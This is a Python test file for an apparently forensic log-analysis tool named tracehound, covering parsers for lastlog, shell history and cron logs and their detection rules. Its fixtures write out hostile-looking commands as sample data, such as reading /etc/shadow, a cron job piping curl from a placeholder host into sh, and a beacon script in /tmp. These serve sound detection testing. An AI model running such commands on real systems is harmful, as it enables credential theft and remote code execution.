from __future__ import annotations

import os
import struct
import time
from datetime import datetime, timezone
from pathlib import Path

from tracehound import scan
from tracehound.models import EventType
from tracehound.parsers import ParseContext, all_parsers, parser_for
from tracehound.parsers.bash_history import ShellHistoryParser
from tracehound.parsers.cron import CronLogParser
from tracehound.parsers.lastlog import RECORD_SIZE as LASTLOG_SIZE
from tracehound.parsers.lastlog import LastlogParser

CTX = ParseContext(default_year=2024)


def _lastlog_record(ts: int, line: str = "", host: str = "") -> bytes:
    buf = bytearray(LASTLOG_SIZE)
    struct.pack_into("<I", buf, 0, ts)
    buf[4 : 4 + len(line.encode())] = line.encode()
    buf[36 : 36 + len(host.encode())] = host.encode()
    return bytes(buf)


class TestLastlogParser:
    def test_parses_populated_records_only(self, tmp_path: Path) -> None:
        """Sparse zero records mean 'never logged in' and must not become events."""
        ts = int(datetime(2024, 3, 6, 6, 32, 45, tzinfo=timezone.utc).timestamp())
        path = tmp_path / "lastlog"
        path.write_bytes(
            _lastlog_record(0)  # uid 0, never
            + _lastlog_record(0)  # uid 1, never
            + _lastlog_record(ts, "pts/1", "65.2.161.68")  # uid 2
        )
        events = list(LastlogParser().parse(path, CTX))

        assert len(events) == 1
        assert events[0].metadata["uid"] == 2
        assert events[0].source_ip == "65.2.161.68"
        assert events[0].terminal == "pts/1"
        assert events[0].timestamp == datetime(2024, 3, 6, 6, 32, 45, tzinfo=timezone.utc)

    def test_sniff_requires_name(self, tmp_path: Path) -> None:
        path = tmp_path / "something-else"
        path.write_bytes(_lastlog_record(1_700_000_000))
        assert not LastlogParser().sniff(path)

    def test_sniff_rejects_bad_size(self, tmp_path: Path) -> None:
        path = tmp_path / "lastlog"
        path.write_bytes(b"\x00" * 33)
        assert not LastlogParser().sniff(path)


class TestShellHistoryParser:
    def test_parses_timestamped_history(self, tmp_path: Path) -> None:
        epoch = int(datetime(2024, 3, 6, 6, 37, 57, tzinfo=timezone.utc).timestamp())
        path = tmp_path / ".bash_history"
        path.write_text(f"#{epoch}\ncat /etc/shadow\n", encoding="utf-8")

        (event,) = list(ShellHistoryParser().parse(path, CTX))
        assert event.event_type is EventType.COMMAND_EXECUTED
        assert event.message == "cat /etc/shadow"
        assert event.metadata["timestamp_precision"] == "exact"
        assert event.timestamp == datetime(2024, 3, 6, 6, 37, 57, tzinfo=timezone.utc)

    def test_bare_history_is_flagged_as_estimated(self, tmp_path: Path) -> None:
        """Undated history must never claim a precision it does not have."""
        path = tmp_path / ".bash_history"
        path.write_text("whoami\nid\ncat /etc/shadow\n", encoding="utf-8")
        mtime = 1_709_707_077
        os.utime(path, (mtime, mtime))

        events = list(ShellHistoryParser().parse(path, CTX))
        assert len(events) == 3
        assert all(e.metadata["timestamp_precision"] == "file_mtime" for e in events)
        assert [e.metadata["sequence"] for e in events] == [1, 2, 3]
        assert all(e.timestamp == datetime.fromtimestamp(mtime, tz=timezone.utc) for e in events)

    def test_infers_user_from_home_path(self, tmp_path: Path) -> None:
        home = tmp_path / "home" / "cyberjunkie"
        home.mkdir(parents=True)
        path = home / ".bash_history"
        path.write_text("id\n", encoding="utf-8")

        (event,) = list(ShellHistoryParser().parse(path, CTX))
        assert event.user == "cyberjunkie"

    def test_ignores_non_timestamp_comments(self, tmp_path: Path) -> None:
        path = tmp_path / ".bash_history"
        path.write_text("#!/bin/bash\nid\n", encoding="utf-8")

        events = list(ShellHistoryParser().parse(path, CTX))
        assert [e.message for e in events] == ["#!/bin/bash", "id"]

    def test_sniff_matches_known_names(self, tmp_path: Path) -> None:
        good = tmp_path / ".zsh_history"
        good.write_text("id\n", encoding="utf-8")
        bad = tmp_path / "history.txt"
        bad.write_text("id\n", encoding="utf-8")

        assert ShellHistoryParser().sniff(good)
        assert not ShellHistoryParser().sniff(bad)


class TestCronParser:
    def test_parses_cmd_line(self, tmp_path: Path) -> None:
        path = tmp_path / "cron"
        path.write_text(
            "Mar  6 06:25:01 host CROND[2218]: (root) CMD (/usr/lib64/sa/sa1 1 1)\n"
            "Mar  6 06:26:01 host CROND[2246]: (backup) CMD (/opt/backup.sh)\n",
            encoding="utf-8",
        )
        events = list(CronLogParser().parse(path, CTX))

        assert len(events) == 2
        assert events[0].event_type is EventType.CRON_JOB
        assert events[0].user == "root"
        assert events[0].metadata["command"] == "/usr/lib64/sa/sa1 1 1"
        assert events[0].metadata["action"] == "CMD"
        assert events[1].user == "backup"

    def test_priority_beats_authlog(self, tmp_path: Path) -> None:
        """A cron log is valid syslog too; the specific parser must win."""
        path = tmp_path / "cron"
        path.write_text(
            "Mar  6 06:25:01 host CROND[2218]: (root) CMD (/usr/bin/true)\n"
            "Mar  6 06:26:01 host CROND[2246]: (root) CMD (/usr/bin/true)\n",
            encoding="utf-8",
        )
        selected = parser_for(path)
        assert selected is not None
        assert selected.name == "cron"

    def test_sniff_needs_multiple_cron_lines(self, tmp_path: Path) -> None:
        path = tmp_path / "cron"
        path.write_text("Mar  6 06:25:01 host sshd[1]: hello\n", encoding="utf-8")
        assert not CronLogParser().sniff(path)


class TestRegistryOrdering:
    def test_priorities_are_ordered(self) -> None:
        priorities = [p.priority for p in all_parsers()]
        assert priorities == sorted(priorities)

    def test_authlog_is_last_resort(self) -> None:
        assert all_parsers()[-1].name == "auth.log"


class TestNewDetections:
    def test_flags_shadow_access_in_history(self, tmp_path: Path) -> None:
        path = tmp_path / ".bash_history"
        path.write_text("ls\ncat /etc/shadow\n", encoding="utf-8")

        result = scan([path], year=2024)
        found = [f for f in result.findings if f.rule_id == "THN-0020"]
        assert len(found) == 1
        assert found[0].metadata["reason"] == "credential store access"
        assert found[0].metadata["timestamp_estimated"] is True
        assert "no timestamps" in found[0].description

    def test_flags_cron_from_tmp(self, tmp_path: Path) -> None:
        path = tmp_path / "cron"
        path.write_text(
            "Mar  6 06:25:01 host CROND[1]: (root) CMD (/tmp/.x/beacon.sh)\n"
            "Mar  6 06:26:01 host CROND[2]: (root) CMD (/usr/bin/true)\n",
            encoding="utf-8",
        )
        result = scan([path], year=2024)
        found = [f for f in result.findings if f.rule_id == "THN-0021"]

        assert len(found) == 1
        assert "world-writable" in found[0].metadata["reason"]

    def test_flags_curl_pipe_shell_cron(self, tmp_path: Path) -> None:
        path = tmp_path / "cron"
        path.write_text(
            "Mar  6 06:25:01 host CROND[1]: (root) CMD (curl http://x.invalid/a | sh)\n"
            "Mar  6 06:26:01 host CROND[2]: (root) CMD (/usr/bin/true)\n",
            encoding="utf-8",
        )
        result = scan([path], year=2024)
        found = [f for f in result.findings if f.rule_id == "THN-0021"]
        assert len(found) == 1

    def test_benign_cron_not_flagged(self, tmp_path: Path) -> None:
        path = tmp_path / "cron"
        path.write_text(
            "Mar  6 06:25:01 host CROND[1]: (root) CMD (/usr/lib64/sa/sa1 1 1)\n"
            "Mar  6 06:26:01 host CROND[2]: (root) CMD (/usr/bin/updatedb)\n",
            encoding="utf-8",
        )
        result = scan([path], year=2024)
        assert [f for f in result.findings if f.rule_id == "THN-0021"] == []


def test_mtime_fixture_is_stable(tmp_path: Path) -> None:
    """Guard against a flaky assumption: os.utime must actually stick."""
    path = tmp_path / ".bash_history"
    path.write_text("id\n", encoding="utf-8")
    os.utime(path, (1_709_707_077, 1_709_707_077))
    assert int(path.stat().st_mtime) == 1_709_707_077
    assert time.time() > 0
